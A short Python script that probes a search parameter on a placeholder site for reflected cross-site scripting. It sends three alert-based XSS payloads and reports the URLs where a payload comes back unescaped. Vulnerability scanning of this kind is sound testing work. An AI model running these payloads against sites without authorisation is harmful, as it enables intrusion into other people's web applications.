import requests

def test_xss(url, parameter):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "'><img src=x onerror=alert('XSS')>"]
    vulnerable = []

    for payload in payloads:
        test_url = f"{url}?{parameter}={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            vulnerable.append(test_url)
    
    return vulnerable

if __name__ == "__main__":
    target_url = "http://example.com/search"
    parameter = "search"
    vulnerabilities = test_xss(target_url, parameter)
    print(f"Possible XSS vulnerabilities: {vulnerabilities}")
